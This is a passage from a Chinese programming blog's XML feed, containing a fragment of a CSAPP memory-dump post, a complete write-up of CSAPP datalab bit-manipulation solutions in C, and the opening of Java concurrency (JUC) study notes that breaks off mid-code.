class="meta"># 0x7ffffffcd568</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>      <span class="meta"># 0x7ffffffcd56f</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span>   <span class="meta"># 0x7ffffffcd577</span></span><br></pre></td></tr></table></figure><p>说明movq %rsp,%rax指令存的是%rsp新值。</p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP实验——datalab</title>
      <link href="/2021/09/13/CSAPP-datalab/"/>
      <url>/2021/09/13/CSAPP-datalab/</url>
      
        <content type="html"><![CDATA[<h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><blockquote><p>Students implement simple logical, two’s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/82529114">Introduction to CSAPP（八）：Datalab</a></p><p><a href="https://blog.csdn.net/qq_42351784/article/details/104908266">CSAPP:datalab</a></p><p><a href="https://zhuanlan.zhihu.com/p/59534845">CSAPP 之 DataLab详解，没有比这更详细的了</a></p><p><a href="https://cloud.tencent.com/developer/article/1826654">《深入理解计算机系统》（CSAPP）实验一 —— Data Lab</a></p><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">   <span class="type">int</span> xAndNoty = x &amp; (~y);</span><br><span class="line">   <span class="type">int</span> notxAndy = (~x) &amp; y;</span><br><span class="line">   <span class="keyword">return</span> ~((~xAndNoty) &amp; (~notxAndy));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>~</code>和<code>&amp;</code>表示异或运算。根据异或运算公式<code>Y = A&#39;·B + A·B&#39; = (A&#39;·B)&#39; · (A·B&#39;)&#39; </code>即可。</p><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回补码的最小值，补码最小值就是符号位为1，其余全为0。直接位移可得。</p><h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">   <span class="type">int</span> i = x + <span class="number">1</span>; <span class="comment">//Tmin,1000...</span></span><br><span class="line">   x = x + i; <span class="comment">//-1,1111...</span></span><br><span class="line">   x = ~x; <span class="comment">//0,0000...</span></span><br><span class="line">   i = !i; <span class="comment">//exclude x=0xffff...</span></span><br><span class="line">   x = x + i; <span class="comment">//exclude x=0xffff...</span></span><br><span class="line">   <span class="keyword">return</span> !x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过位运算计算是否是补码最大值。最大值为符号位为0，其余全1。最后两行是排除<code>x=0xffff</code>的情况，因为<code>0xffff</code>也有前三行的性质。</p><h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> mask = <span class="number">0xAA</span> + (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>) + (<span class="number">0xAA</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0xAA</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line"><span class="comment">//mask &amp; x  留下奇数位的1</span></span><br><span class="line"><span class="comment">//mask ^ (mask &amp; x) 奇数位为1，则异或后变0</span></span><br><span class="line">    <span class="keyword">return</span> !(mask ^ (mask &amp; x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mask变量的所有奇数位都为1，偶数位为0。经过与运算和异或运算后，只有在x为0的奇数位上，<code>mask ^ (mask &amp; x)</code>值为1。若x的所有奇数位都为1，则最终结果<code>mask ^ (mask &amp; x)</code>为全0，经过非运算后返回值为1。</p><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重要结论：<code>x + ~x + 1 = 0</code>。已知x补码，求-x的补码：将x补码各位取反（包括符号位）再加1。</p><h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">   <span class="type">int</span> lowerBound = <span class="number">0x39</span> + ~x + <span class="number">1</span>;</span><br><span class="line">   <span class="type">int</span> upperBound = x + ~<span class="number">0x30</span> + <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">return</span> !((lowerBound | upperBound) &gt;&gt; <span class="number">31</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别计算<code>x-&#39;0&#39;</code>和<code>&#39;9&#39;-x</code>，两结果的符号位皆为0即返回1。</p><h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">   x = !!x; <span class="comment">//逻辑运算变为0 or 1</span></span><br><span class="line">   x = ~x + <span class="number">1</span>; <span class="comment">//若x为True，则x补码全1；若x为False，则x补码全0</span></span><br><span class="line">   <span class="keyword">return</span> (x &amp; y) | (~x &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用位级运算实现三目运算符。根据 <code>x</code> 的布尔值转换为全0或全1来解决。</p><h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">   <span class="type">int</span> subtraction = y + (~x + <span class="number">1</span>); <span class="comment">//y-x</span></span><br><span class="line">   <span class="type">int</span> subtractionSign = (subtraction &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>; <span class="comment">//y-x的符号</span></span><br><span class="line">   <span class="type">int</span> xSign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>; <span class="comment">//x的符号</span></span><br><span class="line">   <span class="type">int</span> ySign = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>; <span class="comment">//y的符号</span></span><br><span class="line">   <span class="type">int</span> bitXor = xSign ^ ySign; <span class="comment">//x和y符号相同标志位，相同为0不同为1</span></span><br><span class="line">   <span class="comment">//返回1有两种情况：1、bitXor为0（符号相同），y-x 的符号为0（y-x&gt;=0）；2、bitXor为1（符号不同）位与x的符号位为1（x&lt;0）</span></span><br><span class="line">   <span class="keyword">return</span> ((!bitXor) &amp; (!subtractionSign)) | (bitXor &amp; xSign);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二者的差值可能过大而溢出，所以仅通过subtractionSign来判断是不行的。</p><h2 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">   <span class="comment">//右移时，高位按符号位补齐</span></span><br><span class="line">   <span class="keyword">return</span> ((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0和最小数的补码是本身，二者的补码一个全0，一个全1。如果是0，位或操作之后符号位为0，位移后为0，返回值1。如果非0，位或操作之后符号位为1，位移后为全1，即值为-1，返回值为0。</p><h2 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">   <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>; <span class="comment">//符号位</span></span><br><span class="line">   <span class="type">int</span> b16, b8, b4, b2, b1, b0;</span><br><span class="line">   <span class="comment">//如果x为正则不变，否则按位取反（这样好找最高位为1的，原来是最高位为0的，这样也将符号位去掉了）</span></span><br><span class="line">   x = (sign &amp; ~x) | (~sign &amp; x);</span><br><span class="line">   <span class="comment">//不断缩小范围</span></span><br><span class="line">   b16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>; <span class="comment">//高十六位是否有1</span></span><br><span class="line">   x = x &gt;&gt; b16; <span class="comment">//如果有（至少需要16位），则将原数右移16位，b16=16 or 0</span></span><br><span class="line">   b8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>; <span class="comment">//剩余高8位是否有1</span></span><br><span class="line">   x = x &gt;&gt; b8; <span class="comment">//如果有（至少需要16+8=24位），则右移8位，b8=8 or 0</span></span><br><span class="line">   b4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>; <span class="comment">//同理</span></span><br><span class="line">   x = x &gt;&gt; b4; <span class="comment">//b4=4 or 0</span></span><br><span class="line">   b2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">   x = x &gt;&gt; b2; <span class="comment">//b2=2 or 0</span></span><br><span class="line">   b1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">   x = x &gt;&gt; b1; <span class="comment">//b1=1 or 0</span></span><br><span class="line">   b0 = x;</span><br><span class="line">   <span class="keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="number">1</span>; <span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是正数，则需要找最高的为1的一位数是第几位，再加上符号位，结果为n+1；如果是负数，则需要知道其最高的一位是0的（例如4位的1101和三位的101补码表示的是一个值：-3，最少需要3位来表示），按位取反转换为正数做同样处理。</p><h2 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">   <span class="type">int</span> <span class="built_in">exp</span> = (uf &amp; <span class="number">0x7f800000</span>) &gt;&gt; <span class="number">23</span>; <span class="comment">//阶码</span></span><br><span class="line">   <span class="type">int</span> sign = uf &amp; (<span class="number">1</span> &lt;&lt; <span class="number">31</span>); <span class="comment">//符号位</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>) <span class="keyword">return</span> uf &lt;&lt; <span class="number">1</span> | sign; <span class="comment">//uf无穷小和0的情况，将原数乘二再加上符号位就行了（并不会越界）</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">255</span>) <span class="keyword">return</span> uf; <span class="comment">//无穷大和NaN的情况，只需要返回参数</span></span><br><span class="line">   <span class="built_in">exp</span>++; <span class="comment">//直接整体左移保持符号位不变即可实现乘2操作</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span> | sign; <span class="comment">//指数+1之后为指数为255则返回原符号无穷大</span></span><br><span class="line">   <span class="keyword">return</span> (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | (uf &amp; <span class="number">0x807fffff</span>); <span class="comment">//指数+1之后的原符号数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复习了一下32位浮点数的表达方式。NaN：阶码全为1，尾数非0；无穷大：阶码全1，尾数全0；非规格化的值：阶码全0。</p><p>根据输入的数值，可以分为三种情况： </p><ol><li>输入uf为无穷大和NaN，直接返回uf</li><li>uf为0或无穷小，返回2*uf | sign</li><li>若exp+1 &#x3D;&#x3D; 255，返回无穷大，否则返回 exp+1。（exp为浮点数编码的整数部分，exp+1相当于uf*2。）</li></ol><h2 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">   <span class="type">int</span> sign = uf &gt;&gt; <span class="number">31</span>; <span class="comment">//符号位</span></span><br><span class="line">   <span class="type">int</span> E = ((uf &amp; <span class="number">0x7f800000</span>) &gt;&gt; <span class="number">23</span>) - <span class="number">127</span>; <span class="comment">//阶码</span></span><br><span class="line">   <span class="type">int</span> frac = (uf &amp; <span class="number">0x007fffff</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>); <span class="comment">//算上默认的1</span></span><br><span class="line">   <span class="keyword">if</span> (!(uf &amp; <span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//原浮点值为0</span></span><br><span class="line">   <span class="keyword">if</span> (E &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//小数</span></span><br><span class="line">   <span class="keyword">if</span> (E &gt;= <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>u; <span class="comment">// 超出int范围</span></span><br><span class="line">   <span class="keyword">if</span> (E &lt; <span class="number">23</span>) frac &gt;&gt;= (<span class="number">23</span> - E); <span class="comment">//舍去部分小数</span></span><br><span class="line">   <span class="keyword">else</span> frac &lt;&lt;= (E - <span class="number">23</span>); <span class="comment">//不需要舍去小数</span></span><br><span class="line">   <span class="keyword">if</span> (sign) <span class="keyword">return</span> -frac;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>非规格化，表示非常接近0的数，转换为int值后为0</li><li>规格化，数的分布从接近0到无穷越来越稀疏，当f不超过int型表示的范围时，转换为int；当超过int型表示的范围时返回0x80000000u</li><li>特殊，返回0x8000000u</li></ol><p>在规格化的float转换为int型整数时，</p><ol><li>如果E &gt;&#x3D; 31，小数点右移31位，此时隐含的1和frac占32位，另外还需要一个符号位，超出了int型范围</li><li>如果E &lt; 0，小数点左移1位后为0.1frac，转换为int后为0</li><li>如果0 &lt; E &lt; 23, 小数点左移E位后需要舍弃frac中部分位，此时直接将frac右移23-E位，抹去小数部分</li><li>如果23 &lt;&#x3D; E &lt; 31，此时小数点右移后frac全部移到小数点以左，将frac左移E-23位，在后面补零</li></ol><h2 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (x &gt;= <span class="number">-149</span> &amp;&amp; x &lt;= <span class="number">-127</span>) <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; (<span class="number">149</span> + x); <span class="comment">//for denormal number</span></span><br><span class="line">   <span class="comment">// 2.0^x = (1.0 * 2^1)^x = 1.0 * 2^x</span></span><br><span class="line">   <span class="type">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">exp</span> &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">exp</span> &gt; <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>; <span class="comment">//返回INF</span></span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>; <span class="comment">//直接将阶码左移23位，尾数全0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>2.0^x = (1.0 * 2^1)^x = 1.0 * 2^x</code>，x就是真正指数。由于测试样例数量过多，btest文件中的限时设定为默认10s时可能会超时，使用<code>-T</code>命令或修改默认值即可。</p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p><img src="https://img.lfalive.top/CSAPP-datalab/result.JPG"></p>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习笔记(5)——JUC</title>
      <link href="/2021/08/15/Learn-java-JUC/"/>
      <url>/2021/08/15/Learn-java-JUC/</url>
      
        <content type="html"><![CDATA[<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><a href="https://www.kuangstudy.com/">狂神说java官网</a></p><p><a href="https://www.bilibili.com/video/BV1B7411L7tE">B站视频链接</a></p><p><a href="https://blog.lfalive.top/2021/06/24/Learn-java-thread/">多线程回顾</a></p><h1 id="什么是JUC"><a href="#什么是JUC" class="headerlink" title="什么是JUC"></a>什么是JUC</h1><p><code>java.util</code>工具包。</p><h1 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h1><p>一个进程可以包含多个线程，至少包含一个。Java默认有2个线程：main、GC。</p><p>多线程，对于Java而言：<code>Thread</code>、<code>Runnable</code>、<code>Callable</code>。</p><p> <strong>Java真的可以开启线程吗？开不了！</strong>Java是调用本地方法，底层是C++。Java无法直接操作硬件。</p><p>并发和并行：</p><ul><li>并发：多线程操作同一个资源。CPU一核，模拟出来多条线程，快速交替。</li><li>并行：多个人一起行走。CPU多核，多个线程可以同时执行。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取CPU的核数</span></span><br><span class="line">System.out.println(Runtime.getRuntime().availableProcessors());</span><br></pre></td></tr></table></figure><p>并发编程的本质：<strong>充分利用CPU的资源</strong>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 线程的几个状态</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">State</span> &#123;</span><br><span class="line">   <span class="comment">// 新生</span></span><br><span class="line">   NEW,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 运行</span></span><br><span class="line">   RUNNABLE,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 阻塞</span></span><br><span class="line">   BLOCKED,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 等待，死等</span></span><br><span class="line">   WAITING,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 超时等待</span></span><br><span class="line">   TIMED_WAITING,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 终止</span></span><br><span class="line">   TERMINATED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>wait和sleep的区别</strong></p><ol><li><p><strong>来自不同的类</strong>：wait&#x3D;&gt;Object，sleep&#x3D;&gt;Thread。</p></li><li><p><strong>关于锁的释放</strong>：wait会释放锁，sleep不会。</p></li><li><p><strong>使用的范围不同</strong>：wait必须在同步代码块中，sleep可以在任何地方睡。</p></li></ol><h1 id="Lock锁"><a href="#Lock锁" class="headerlink" title="Lock锁"></a>Lock锁</h1><p>公平锁：十分公平，先来后到</p><p>非公平锁：不公平，可以插队（默认）</p><h2 id="Synchronized和Lock的区别"><a href="#Synchronized和Lock的区别" class="headerlink" title="Synchronized和Lock的区别"></a>Synchronized和Lock的区别</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 真正的多线程开发，降低耦合性</span></span><br><span class="line"><span class="comment"> * 线程就是一个单独的资源类，没有任何附属的操作</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SaleTicketDemo1</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">// 并发：多线程操作同一个资源类，把资源类丢入线程</span></span><br><span class="line">      <span class="type">Ticket</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ticket</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// lambda表达式 ()-&gt;&#123;&#125;</span></span><br><span class="line">      <span class="keyword">new</span> 